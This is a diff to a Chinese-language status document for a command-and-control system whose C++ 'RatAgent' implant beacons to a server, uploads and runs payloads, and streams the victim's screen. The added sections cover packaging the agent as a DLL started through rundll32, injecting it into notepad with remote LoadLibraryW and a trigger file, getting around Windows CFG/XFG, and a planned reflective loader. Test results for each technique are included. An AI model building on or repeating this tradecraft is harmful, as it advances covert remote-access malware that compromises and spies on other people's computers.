@@ -6,10 +6,11 @@
 ## 1. 项目概览
 
 `c2/` —— 基于《ARCHITECTURE.md》的 C2 远控系统（已按 DESIGN.md 演进）：
-- **Agent**：C++（`c2/client/core`）。**当前 `main()` 默认入口是 `run_beacon`（HTTP 轮询 8080）**；
-  长连接模式 `run_agent`（TCP 4444）在 `main.cpp` 中保留，切换只需改 `main()` 里那一行
+- **Agent**：C++（`c2/client/core`），**同一套源码出两种产物**：
+  - `RatAgent.exe`（控制台形态，`main.cpp`）：默认 beacon（HTTP 轮询 8080），`-tcp` 切长连接（4444）
+  - `RatAgent.dll`（`agent_dll.cpp` + `agent_runtime`）：rundll32 / 宿主 LoadLibrary / 注入，可优雅停止与卸载
 - **Server**：Go（`c2/server/cmd/c2server`），TCP 4444（ctl 信道）+ HTTP 8080（beacon）+ **TCP 4445（屏幕流中继）**
-- **CTL**：`ratctl`（Go 交互式 shell）+ `im_ctl`（ImGui 控制端）+ **`viewer`（C++ Win32 远控查看器，新）**
+- **CTL**：`ratctl`（Go 交互式 shell）+ `im_ctl`（ImGui 控制端）+ `viewer`（C++ Win32 远控查看器）
 
 ## 2. 已完成功能
 
@@ -26,6 +27,10 @@
 | **远程截屏 0x1001**（GDI 抓帧 + WIC JPEG） | ✅ | 本轮 e2e（257 KB JPEG） |
 | **payload 上传执行 0x3009**（分块→%TEMP%→CreateProcess） | ✅ | 本轮 e2e（真实执行 + 标记文件） |
 | **viewer（C++ Win32 查看器）** | ✅ | 本轮 e2e（190 帧 + 输入下发 + 停流） |
+| **Agent DLL 形态**（rundll32 / LoadLibrary / 注入） | ✅ | §8.4（导出表/依赖/三种宿主） |
+| **可停止**（进程内标志 + 跨进程命名事件） | ✅ | §8.4（rundll32 ↔ 另一进程 Stop；宿主存活） |
+| **`-tcp` 长连接模式可命令行切换**（不必改 `main()`） | ✅ | §8.4（sessions 显示真实 IP:PORT） |
+| **注入自启动触发器**（`autostart.args`） | ✅ | §8.4（远程 LoadLibrary 到 notepad 内上线） |
 | 本地 git 版本管理（VS 专用 .gitignore） | ✅ | 见 §4 |
 
 ## 3. 关键架构（屏幕流 + payload）
@@ -66,18 +71,23 @@ go build -o build/bin/c2server.exe ./server/cmd/c2server
 go build -o build/bin/ratctl.exe   ./ctl/cmd/ratctl
 go test ./...
 
-# 2) Agent（VS2022/18 MSBuild；输出到工作区 build/，避开既有 VS 目录 ACL）
-& 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe' `
-  client\RatAgent.vcxproj -p:Configuration=Debug -p:Platform=x64 `
+# 2) Agent EXE + DLL（VS2022/18 MSBuild；输出到工作区 build/，避开既有 VS 目录 ACL）
+$msb = 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe'
+& $msb client\RatAgent.vcxproj -p:Configuration=Debug -p:Platform=x64 `
   -p:IntDir=D:/code/projects/c2/build/agent/obj/ -p:OutDir=D:/code/projects/c2/build/agent/bin/
+& $msb client\RatAgentDll.vcxproj -p:Configuration=Debug -p:Platform=x64 `
+  -p:IntDir=D:/code/projects/c2/build/dll/obj/ -p:OutDir=D:/code/projects/c2/build/dll/bin/
 
 # 3) viewer（CMake，独立工程）
 cmake -S viewer -B build/viewer
 cmake --build build/viewer --config Debug        # 产物 build/viewer/bin/viewer.exe
 
-# 4) 运行联调（beacon 模式：Agent 连 8080，-s 为轮询秒数）
+# 4) 运行联调（beacon 默认；-tcp 切长连接）
 .\build\bin\c2server.exe
-.\build\agent\bin\RatAgent.exe 127.0.0.1 8080 -s 5
+.\build\agent\bin\RatAgent.exe 127.0.0.1 8080 -s 5      # beacon
+.\build\agent\bin\RatAgent.exe 127.0.0.1 4444 -tcp      # TCP 长连接
+rundll32 .\build\dll\bin\RatAgent.dll,Start 127.0.0.1,8080,-s,5,id=.\build\dll\run\agent.id,log=.\build\dll\run\agent.log
+rundll32 .\build\dll\bin\RatAgent.dll,Stop  id=.\build\dll\run\agent.id,log=.\build\dll\run\agent.log
 .\build\bin\ratctl.exe                           # 交互式：sessions → use <id> → ...
 ```
 
@@ -94,14 +104,27 @@ screenshot [id] <file> / screen [id] [fps] [quality] [scale] / stop / payload <f
 3. **payload 落盘策略**：当前固定 `%TEMP%\c2_payload\<name>`，同名覆盖、不自动清理
 4. **e2e_m1/m2 过时**：直连模型历史脚本，可归档
 5. 正式化：PSK 外部化、多显示器/区域抓屏配置、屏幕流码率自适应
+6. **（可选）仓库内注入器/加载器工具**：本轮验证用的 `inject.exe`（远程 LoadLibrary + 触发器）
+   是临时测试工具，未入库；如需长期使用可在 `tools/` 下补一个正式版本
+7. **（可选）手动映射 loader**：DLL 已按契约适配（静态 CRT/不依赖模块路径/无 TLS），
+   但仓库内没有 reflective loader
 
 ## 7. 已知注意点
 
 - **构建目录 ACL**：`bin/`、`client/x64/`、`client/RatAgent/x64/`、`im_ctl/build/` 等
   既有目录在受限（沙箱）会话下**不可写**；受限环境一律输出到工作区内新目录
   `build/`、`.gocache/`（已在 .gitignore）
-- **Agent 默认入口**：`client/core/main.cpp` 的 `main()` 当前调用 `run_beacon`（HTTP 8080）。
-  要用长连接模式，把 `int rc = run_beacon(argc, argv);` 改成 `run_agent(host, port)`
+- **Agent 入口与模式**：`main.cpp` 现在是薄壳（解析 argv → `agent_start` → 等待），
+  默认 beacon；**`-tcp` 参数即可切长连接**（不必再改 `main()` 源码）
+- **DLL 形态要点**（详见 DESIGN §4.2.1）：
+  - rundll32 的 `Start` **阻塞驻留**（入口点返回 = rundll32 退出进程）；宿主/注入器用非阻塞的 `StartAgent`
+  - 停止：进程内标志 + 命名事件 `Local\RatAgentStop.<agent_id_hex>`；
+    `Stop` 可在**另一个进程**里按 id 文件或 32 位 hex 触发
+  - 注入：**不要**把远程线程入口指向导出（目标的 CFG/XFG 会给 `0xC0000409`）；
+    用"写 `%LOCALAPPDATA%\RatAgent\autostart.args`（或 `%TEMP%` 下）→ 远程 `LoadLibraryW` → 触发器自启动"
+  - DLL 默认落盘 `%LOCALAPPDATA%\RatAgent\`（`agent.id`/`agent.log`），可用 `id=`/`log=` 覆盖；
+    静态 CRT `/MT`，`dumpbin /dependents` 只有系统 DLL
+  - 手动映射须先调用入口点（`DLL_PROCESS_ATTACH`）初始化 CRT，再调导出
 - **测试用后台进程**：用 `Start-Process` 或工具前台上限内启动的进程可能在命令结束时被回收；
   长跑进程用受管后台作业启动
 - **屏幕流参数已生效**：`fps/quality/scale` 全部按 0x1002 参数工作（截屏 0x1001 质量为 75）；
@@ -158,3 +181,23 @@ screenshot [id] <file> / screen [id] [fps] [quality] [scale] / stop / payload <f
 | 线程自行退出后重启 | 杀掉 C2 → Agent `input channel broken` → `stopped`；重启 C2 后再 start → `screen stream started`（修复前会返回"已在运行"） |
 
 > 本轮验证用临时探针（`build/e2e/probe.go`，gitignored；验证后已移入回收站）。
+
+### 8.4 第三轮：Agent 双产物（EXE/DLL）验证证据
+
+| 场景 | 做法 | 结果 |
+|---|---|---|
+| 导出表 | `dumpbin /exports RatAgent.dll` | ✅ `Start/Stop/StartAgent/StopAgent/StopAgentEx/AgentRunning/AgentVersion/AgentMode/AgentPing/AgentBootstrap` |
+| 依赖（注入安全） | `dumpbin /dependents` | ✅ 仅系统 DLL，**无 VC 运行库 DLL**（静态 CRT `/MT`） |
+| rundll32 启动 | `rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5,id=…,log=…` | ✅ 日志落盘 + beacon 上线 + 进程驻留 >20s |
+| 跨进程停止 | 另一进程 `rundll32 … ,Stop id=<id 文件>` | ✅ `-> signalled` → 目标实例 `[beacon] stopped` → 入口点返回、进程退出 |
+| LoadLibrary 宿主 | `LoadLibraryW` → `StartAgent` → `StopAgent` → `FreeLibrary` | ✅ 上线 → 优雅停止（`running=0`）→ 卸载无异常 |
+| 注入（远程加载 + 触发器） | 写 `%TEMP%\RatAgent\autostart.args` → 远程 `LoadLibraryW` 进 notepad | ✅ agent 在 **notepad 进程内**上线；跨进程 Stop 后**宿主进程存活** |
+| EXE 回归（beacon） | `RatAgent.exe 127.0.0.1 8080 -s 5` | ✅ 稳定 id、beacon-agent 上线 |
+| EXE 新 `-tcp` | `RatAgent.exe 127.0.0.1 4444 -tcp` | ✅ 握手成功；sessions 显示真实 `127.0.0.1:58484` / `os=Windows`，与 beacon 并存 |
+| DLL 配置 | Debug 与 Release | ✅ 均生成（两者都 `/MT`） |
+
+**重要反面证据**：把远程线程入口直接指向 DLL 导出（含零 CRT 依赖的 `AgentPing`）在 Win11 目标
+返回 `0xC0000409`（`__fastfail`）——目标进程的 CFG/XFG 缓解；而远程 `LoadLibraryW`（kernel32 地址）
+正常。故注入采用"远程加载 + `autostart.args` 触发器自启动"。
+
+> 本轮验证用临时工具（`build/e2e/{host,inject}.cpp` + `probe`，gitignored；验证后已移入回收站）。
